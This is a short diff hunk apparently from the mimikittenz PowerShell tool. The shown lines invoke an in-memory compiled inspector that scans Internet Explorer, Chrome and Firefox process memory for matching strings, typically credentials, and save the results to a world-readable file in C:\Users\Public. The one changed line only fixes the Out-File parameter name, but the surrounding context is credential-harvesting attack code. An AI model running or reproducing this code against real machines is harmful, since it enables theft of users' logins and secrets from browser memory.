@@ -531,6 +531,6 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
 $matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
 
-write-output $matchesFound | Out-File -Path C:\Users\Public\yup.txt
+write-output $matchesFound | Out-File -FilePath C:\Users\Public\yup.txt
 }
 invoke-mimikittenz
